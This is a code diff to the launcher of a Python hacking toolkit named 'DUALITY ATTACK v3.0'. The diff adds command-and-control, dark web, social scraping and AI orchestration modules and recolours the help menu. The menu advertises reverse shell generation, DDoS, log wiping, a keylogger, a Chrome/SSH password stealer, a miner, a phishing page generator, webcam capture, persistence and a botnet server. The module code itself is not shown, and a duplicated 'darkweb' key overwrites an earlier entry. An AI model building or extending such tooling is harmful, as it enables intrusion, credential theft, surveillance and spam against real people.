@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # DUALITY ATTACK v3.0 - Complete Edition (31 Modules)
 # "The darkness that consumes the light"
-
 import sys
 import os
 from core.colors import Colors
@@ -48,6 +47,10 @@ from modules.attack.tracking.phone_tracker import PhoneTracker
 from modules.attack.spam.spammer import Spammer
 from modules.utility.rot13 import ROT13Tool
 from modules.utility.finder import FindWrapper
+from modules.attack.ai_scanner.ai_assistant import AIAssistant
+from modules.attack.ai_scanner.vuln_scanner import VulnScanner
+from modules.utility.qr_gen import QRGenerator
+from modules.utility.speedtest import SpeedTest
 
 # Botnet (1)
 from modules.botnet.server import BotnetServer
@@ -66,6 +69,11 @@ from modules.advanced.darkweb_c2 import DarkWebC2
 from modules.advanced.webcam import WebcamCapture
 from modules.attack.tracking.phone_tracker import PhoneTracker
 from modules.attack.spam.spammer import Spammer
+from modules.attack.c2_gui.c2_gui import C2GUI
+from modules.attack.darkweb.darkweb_integration import DarkWebIntegration
+from modules.attack.social.social_scraper import SocialMediaScraper
+from modules.advanced.forensics.memory_forensics import MemoryForensics
+from modules.advanced.ai_agents.orchestrator import AIOrchestrator
 
 class DualityAttack:
     def __init__(self):
@@ -109,6 +117,10 @@ class DualityAttack:
             'malware': EducationalMalware(),
             'rot13': ROT13Tool(),
             'find': FindWrapper(),
+            'aiassist': AIAssistant(),
+            'vulnscan': VulnScanner(),
+            'qr': QRGenerator(),
+            'speedtest': SpeedTest(),
             # Botnet (1)
             'botnet': BotnetServer(),
             # Advanced (11)
@@ -123,105 +135,114 @@ class DualityAttack:
             'update': AutoUpdater(),
             'darkweb': DarkWebC2(),
             'webcam': WebcamCapture(),
+            'c2gui': C2GUI(),
+            'darkweb': DarkWebIntegration(),
+            'social': SocialMediaScraper(),
+            'memforensics': MemoryForensics(),
+            'aiorchestrator': AIOrchestrator(),
             }
         
     def banner(self):
+        """Tampilkan logo dan banner"""
         clear_screen()
-        banner = f"""
+
+    # Coba tampilkan logo skull (txt, BUKAN png)
+        logo_path = os.path.join(os.path.dirname(__file__), 'assets', 'skull_logo.txt')
+        if os.path.exists(logo_path):
+            with open(logo_path, 'r') as f:
+                print(f.read())
+        else:
+        # Fallback jika logo tidak ada
+            print(f"""
 {Colors.RED}{Colors.BOLD}
-╔═══════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                       ║
-║   ██████╗ ██╗   ██╗ █████╗ ██╗     ██╗████████╗██╗   ██╗                            ║
-║   ██╔══██╗██║   ██║██╔══██╗██║     ██║╚══██╔══╝╚██╗ ██╔╝                            ║
-║   ██║  ██║██║   ██║███████║██║     ██║   ██║    ╚████╔╝                             ║
-║   ██║  ██║██║   ██║██╔══██║██║     ██║   ██║     ╚██╔╝                              ║
-║   ██████╔╝╚██████╔╝██║  ██║███████╗██║   ██║      ██║                               ║
-║   ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝      ╚═╝                               ║
-║                                                                                       ║
-║   █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗                                  ║
-║   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝                                  ║
-║   ███████║   ██║      ██║   ███████║██║     █████╔╝                                   ║
-║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗                                   ║
-║   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗                                  ║
-║   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                  ║
-║                                                                                       ║
-╚═══════════════════════════════════════════════════════════════════════════════════════╝
+╔═══════════════════════════════════════════════════════════════╗
+║                    DUALITY ATTACK v{self.version}                     ║
+║              "The darkness that consumes the light"            ║
+╚═══════════════════════════════════════════════════════════════╝
 {Colors.END}
-{Colors.CYAN}{Colors.BOLD}                         DUALITY ATTACK v{self.version}{Colors.END}
-{Colors.DIM}                              "The darkness that consumes the light"{Colors.END}
-{Colors.RED}{'═'*79}{Colors.END}
-        """
-        print(banner)
-    
+        """)
+        print(f"{Colors.RED}{Colors.BOLD}                              DUALITY ATTACK v{self.version}{Colors.END}")
+        print(f"{Colors.DIM}                           \"The darkness that consumes the light\"{Colors.END}")
+        print(f"{Colors.RED}{'═'*71}{Colors.END}")
+        
     def show_help(self):
         help_text = f"""
 {Colors.RED}{'═'*79}{Colors.END}
 {Colors.BOLD}{Colors.WHITE}                         DUALITY ATTACK - COMPLETE EDITION{Colors.END}
 {Colors.RED}{'═'*79}{Colors.END}
 
-{Colors.CYAN}{Colors.BOLD}📱 OSINT MODULES ({Colors.GREEN}9 modules{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}phone{Colors.WHITE}      - Phone number OSINT with carrier detection
-{Colors.WHITE}  {Colors.GREEN}ip{Colors.WHITE}         - IP address geolocation tracker
-{Colors.WHITE}  {Colors.GREEN}username{Colors.WHITE}   - Check username across social media
-{Colors.WHITE}  {Colors.GREEN}subdomain{Colors.WHITE}  - Subdomain discovery scanner
-{Colors.WHITE}  {Colors.GREEN}port{Colors.WHITE}       - TCP port scanner (1-1000)
-{Colors.WHITE}  {Colors.GREEN}dork{Colors.WHITE}       - Google dork generator
-{Colors.WHITE}  {Colors.GREEN}email{Colors.WHITE}      - Email OSINT / breach check
-{Colors.WHITE}  {Colors.GREEN}whois{Colors.WHITE}      - WHOIS domain lookup
-{Colors.WHITE}  {Colors.GREEN}dns{Colors.WHITE}        - DNS records lookup (A, MX, NS, TXT)
+{Colors.RED}{Colors.BOLD}📱 OSINT MODULES ({Colors.WHITE}9 modules{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}phone{Colors.DIM}      - Phone number OSINT with carrier detection
+{Colors.WHITE}  {Colors.WHITE}ip{Colors.DIM}         - IP address geolocation tracker
+{Colors.WHITE}  {Colors.WHITE}username{Colors.DIM}   - Check username across social media
+{Colors.WHITE}  {Colors.WHITE}subdomain{Colors.DIM}  - Subdomain discovery scanner
+{Colors.WHITE}  {Colors.WHITE}port{Colors.DIM}       - TCP port scanner (1-1000)
+{Colors.WHITE}  {Colors.WHITE}dork{Colors.DIM}       - Google dork generator
+{Colors.WHITE}  {Colors.WHITE}email{Colors.DIM}      - Email OSINT / breach check
+{Colors.WHITE}  {Colors.WHITE}whois{Colors.DIM}      - WHOIS domain lookup
+{Colors.WHITE}  {Colors.WHITE}dns{Colors.DIM}        - DNS records lookup (A, MX, NS, TXT)
 
-{Colors.CYAN}{Colors.BOLD}⚔️ ATTACK MODULES ({Colors.GREEN}8 modules{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}payload{Colors.WHITE}    - Generate reverse shell (Python/Bash/PHP)
-{Colors.WHITE}  {Colors.GREEN}ddos{Colors.WHITE}       - DDoS attack simulation
-{Colors.WHITE}  {Colors.GREEN}stealth{Colors.WHITE}    - Clean traces, wipe logs
-{Colors.WHITE}  {Colors.GREEN}anon{Colors.WHITE}       - Anonymity (Tor network)
-{Colors.WHITE}  {Colors.GREEN}c2{Colors.WHITE}         - C2 / Listener server (HTTP/Netcat)
-{Colors.WHITE}  {Colors.GREEN}track{Colors.WHITE}      - Phone number tracker
-{Colors.WHITE}  {Colors.GREEN}spam{Colors.WHITE}       - Email/SMS spammer
-{Colors.WHITE}  {Colors.GREEN}lanscan{Colors.WHITE}     - LAN network scanner (detect devices)
-{Colors.WHITE}  {Colors.GREEN}subenum{Colors.WHITE}     - Subdomain enumeration
-{Colors.WHITE}  {Colors.GREEN}emailscrape{Colors.WHITE} - Email scraper from website
-{Colors.WHITE}  {Colors.GREEN}linkextract{Colors.WHITE} - Extract all links
-{Colors.WHITE}  {Colors.GREEN}dirbrute{Colors.WHITE}    - Directory brute force
-{Colors.WHITE}  {Colors.GREEN}portadv{Colors.WHITE}     - Advanced port scanner
+{Colors.RED}{Colors.BOLD}⚔️ ATTACK MODULES ({Colors.WHITE}8 modules{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}payload{Colors.DIM}    - Generate reverse shell (Python/Bash/PHP)
+{Colors.WHITE}  {Colors.WHITE}ddos{Colors.DIM}       - DDoS attack simulation
+{Colors.WHITE}  {Colors.WHITE}stealth{Colors.DIM}    - Clean traces, wipe logs
+{Colors.WHITE}  {Colors.WHITE}anon{Colors.DIM}       - Anonymity (Tor network)
+{Colors.WHITE}  {Colors.WHITE}c2{Colors.DIM}         - C2 / Listener server (HTTP/Netcat)
+{Colors.WHITE}  {Colors.WHITE}track{Colors.DIM}      - Phone number tracker
+{Colors.WHITE}  {Colors.WHITE}spam{Colors.DIM}       - Email/SMS spammer
+{Colors.WHITE}  {Colors.WHITE}lanscan{Colors.DIM}     - LAN network scanner (detect devices)
+{Colors.WHITE}  {Colors.WHITE}subenum{Colors.DIM}     - Subdomain enumeration
+{Colors.WHITE}  {Colors.WHITE}emailscrape{Colors.DIM} - Email scraper from website
+{Colors.WHITE}  {Colors.WHITE}linkextract{Colors.DIM} - Extract all links
+{Colors.WHITE}  {Colors.WHITE}dirbrute{Colors.DIM}    - Directory brute force
+{Colors.WHITE}  {Colors.WHITE}portadv{Colors.DIM}     - Advanced port scanner
 
-{Colors.CYAN}{Colors.BOLD}🔥 ADVANCED ATTACK ({Colors.GREEN}6 modules{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}phish{Colors.WHITE}      - Phishing page generator
-{Colors.WHITE}  {Colors.GREEN}wificrack{Colors.WHITE}  - WiFi password cracker
-{Colors.WHITE}  {Colors.GREEN}camhack{Colors.WHITE}    - Live camera hack
-{Colors.WHITE}  {Colors.GREEN}pentest{Colors.WHITE}    - Auto pentest report
-{Colors.WHITE}  {Colors.GREEN}ddospanel{Colors.WHITE}  - DDoS web panel
-{Colors.WHITE}  {Colors.GREEN}exploitdb{Colors.WHITE}  - Auto exploit database
+{Colors.RED}{Colors.BOLD}🔥 ADVANCED ATTACK ({Colors.WHITE}6 modules{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}phish{Colors.DIM}      - Phishing page generator
+{Colors.WHITE}  {Colors.WHITE}wificrack{Colors.DIM}  - WiFi password cracker
+{Colors.WHITE}  {Colors.WHITE}camhack{Colors.DIM}    - Live camera hack
+{Colors.WHITE}  {Colors.WHITE}pentest{Colors.DIM}    - Auto pentest report
+{Colors.WHITE}  {Colors.WHITE}ddospanel{Colors.DIM}  - DDoS web panel
+{Colors.WHITE}  {Colors.WHITE}exploitdb{Colors.DIM}  - Auto exploit database
+{Colors.WHITE}  {Colors.WHITE}vulnscan{Colors.DIM}   - Auto vulnerability scanner
 
-{Colors.CYAN}🛠️ UTILITY MODULES ({Colors.GREEN}7 modules{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}crypt{Colors.WHITE}      - AES file encryption/decryption
-{Colors.WHITE}  {Colors.GREEN}hash{Colors.WHITE}       - Hash generator (MD5/SHA1/SHA256)
-{Colors.WHITE}  {Colors.GREEN}encode{Colors.WHITE}     - Base64/URL encoder decoder
-{Colors.WHITE}  {Colors.GREEN}passgen{Colors.WHITE}    - Random password generator
-{Colors.WHITE}  {Colors.GREEN}malware{Colors.WHITE}    - Educational malware generator
-{Colors.WHITE}  {Colors.GREEN}rot13{Colors.WHITE}      - ROT13 cipher encoder/decoder
-{Colors.WHITE}  {Colors.GREEN}find{Colors.WHITE}       - Find command wrapper
+{Colors.RED}🛠️ UTILITY MODULES ({Colors.WHITE}7 modules{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}crypt{Colors.DIM}      - AES file encryption/decryption
+{Colors.WHITE}  {Colors.WHITE}hash{Colors.DIM}       - Hash generator (MD5/SHA1/SHA256)
+{Colors.WHITE}  {Colors.WHITE}encode{Colors.DIM}     - Base64/URL encoder decoder
+{Colors.WHITE}  {Colors.WHITE}passgen{Colors.DIM}    - Random password generator
+{Colors.WHITE}  {Colors.WHITE}malware{Colors.DIM}    - Educational malware generator
+{Colors.WHITE}  {Colors.WHITE}rot13{Colors.DIM}      - ROT13 cipher encoder/decoder
+{Colors.WHITE}  {Colors.WHITE}find{Colors.DIM}       - Find command wrapper
+{Colors.WHITE}  {Colors.WHITE}aiassist{Colors.DIM}   - AI Assistant chatbot
+{Colors.WHITE}  {Colors.WHITE}qr{Colors.DIM}         - QR Code generator
+{Colors.WHITE}  {Colors.WHITE}speedtest{Colors.DIM}  - Network speed test
 
-{Colors.CYAN}{Colors.BOLD}🤖 BOTNET MODULES ({Colors.GREEN}1 module{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}botnet{Colors.WHITE}     - Botnet C2 server (HTTP API)
+{Colors.RED}{Colors.BOLD}🤖 BOTNET MODULES ({Colors.WHITE}1 module{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}botnet{Colors.DIM}     - Botnet C2 server (HTTP API)
 
-{Colors.CYAN}{Colors.BOLD}🚀 ADVANCED MODULES ({Colors.GREEN}11 modules{Colors.CYAN}){Colors.END}
-{Colors.WHITE}  {Colors.GREEN}ai{Colors.WHITE}         - AI payload generator & vulnerability analysis
-{Colors.WHITE}  {Colors.GREEN}exploit{Colors.WHITE}    - Auto exploiter (SQLi/XSS/LFI scanner)
-{Colors.WHITE}  {Colors.GREEN}persist{Colors.WHITE}    - Persistence module (cron/systemd)
-{Colors.WHITE}  {Colors.GREEN}transfer{Colors.WHITE}   - File upload/download
-{Colors.WHITE}  {Colors.GREEN}screenshot{Colors.WHITE} - Screenshot capture (termux-api)
-{Colors.WHITE}  {Colors.GREEN}keylog{Colors.WHITE}     - Keylogger (record keystrokes)
-{Colors.WHITE}  {Colors.GREEN}steal{Colors.WHITE}      - Password stealer (Chrome/SSH)
-{Colors.WHITE}  {Colors.GREEN}miner{Colors.WHITE}      - Crypto miner (XMRig simulation)
-{Colors.WHITE}  {Colors.GREEN}update{Colors.WHITE}     - Auto updater (git pull)
-{Colors.WHITE}  {Colors.GREEN}darkweb{Colors.WHITE}    - Dark web C2 (Tor hidden service)
-{Colors.WHITE}  {Colors.GREEN}webcam{Colors.WHITE}     - Webcam capture (termux-api)
+{Colors.RED}{Colors.BOLD}🚀 ADVANCED MODULES ({Colors.WHITE}11 modules{Colors.CYAN}){Colors.END}
+{Colors.WHITE}  {Colors.WHITE}ai{Colors.DIM}         - AI payload generator & vulnerability analysis
+{Colors.WHITE}  {Colors.WHITE}exploit{Colors.DIM}    - Auto exploiter (SQLi/XSS/LFI scanner)
+{Colors.WHITE}  {Colors.WHITE}persist{Colors.DIM}    - Persistence module (cron/systemd)
+{Colors.WHITE}  {Colors.WHITE}transfer{Colors.DIM}   - File upload/download
+{Colors.WHITE}  {Colors.WHITE}screenshot{Colors.DIM} - Screenshot capture (termux-api)
+{Colors.WHITE}  {Colors.WHITE}keylog{Colors.DIM}     - Keylogger (record keystrokes)
+{Colors.WHITE}  {Colors.WHITE}steal{Colors.DIM}      - Password stealer (Chrome/SSH)
+{Colors.WHITE}  {Colors.WHITE}miner{Colors.DIM}      - Crypto miner (XMRig simulation)
+{Colors.WHITE}  {Colors.WHITE}update{Colors.DIM}     - Auto updater (git pull)
+{Colors.WHITE}  {Colors.WHITE}darkweb{Colors.DIM}    - Dark web C2 (Tor hidden service)
+{Colors.WHITE}  {Colors.WHITE}webcam{Colors.DIM}     - Webcam capture (termux-api)
+{Colors.WHITE}  {Colors.WHITE}c2gui{Colors.DIM}     - C2 Server with GUI dashboard
+{Colors.WHITE}  {Colors.WHITE}darkweb{Colors.DIM}   - Dark web integration (Tor)
+{Colors.WHITE}  {Colors.WHITE}social{Colors.DIM}    - Social media scraper
+{Colors.WHITE}  {Colors.WHITE}memforensics{Colors.DIM} - Memory forensics (capture & analyze)
+{Colors.WHITE}  {Colors.WHITE}aiorchestrator{Colors.DIM} - AI multi-agent orchestrator
 
-{Colors.CYAN}{Colors.BOLD}⚙️ SYSTEM COMMANDS{Colors.END}
-{Colors.WHITE}  {Colors.GREEN}help{Colors.WHITE}       - Show this help menu
-{Colors.WHITE}  {Colors.GREEN}clear{Colors.WHITE}      - Clear screen
-{Colors.WHITE}  {Colors.GREEN}exit{Colors.WHITE}       - Exit DUALITY
+{Colors.RED}{Colors.BOLD}⚙️ SYSTEM COMMANDS{Colors.END}
+{Colors.WHITE}  {Colors.WHITE}help{Colors.DIM}       - Show this help menu
+{Colors.WHITE}  {Colors.WHITE}clear{Colors.DIM}      - Clear screen
+{Colors.WHITE}  {Colors.WHITE}exit{Colors.DIM}       - Exit DUALITY
 
 {Colors.RED}{'═'*79}{Colors.END}
 {Colors.DIM}[*] Type any module name to run it | Example: phone, ip, username, help{Colors.END}
@@ -234,7 +255,7 @@ class DualityAttack:
         
         while True:
             try:
-                cmd = input(f"\n{Colors.RED}┌──({Colors.RED}duality{Colors.RED}@{Colors.RED}attack{Colors.RED})-{Colors.RED}[{os.getcwd().replace(os.path.expanduser('~'), '~')}]{Colors.RED}\n└─{Colors.WHITE}$ {Colors.END}").strip().lower()
+                cmd = input(f"\n{Colors.WHITE}┌──({Colors.RED}duality{Colors.RED}@{Colors.RED}attack{Colors.WHITE})-{Colors.DIM}[{os.getcwd().replace(os.path.expanduser('~'), '~')}]{Colors.WHITE}\n└─{Colors.RED}$ {Colors.END}").strip().lower()
                 
                 if cmd == 'exit':
                     print(f"\n{Colors.RED}[!] Exiting DUALITY...{Colors.END}")
@@ -248,15 +269,15 @@ class DualityAttack:
                     input(f"\n{Colors.DIM}Press Enter to continue...{Colors.END}")
                     self.banner()
                 elif cmd:
-                    print(f"{Colors.RED}[!] Unknown command: {cmd}{Colors.END}")
-                    print(f"{Colors.DIM}[*] Type 'help' for available commands{Colors.END}")
+                    from core.utils import print_error
+                    print_error(f"Unknown command: '{cmd}'", show_tip=True)
                     
             except KeyboardInterrupt:
                 print(f"\n{Colors.RED}[!] Interrupted. Exiting...{Colors.END}")
                 sys.exit(0)
             except Exception as e:
-                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
-
+                from core.utils import print_error
+                print_error(str(e))
 if __name__ == "__main__":
     app = DualityAttack()
     app.run()
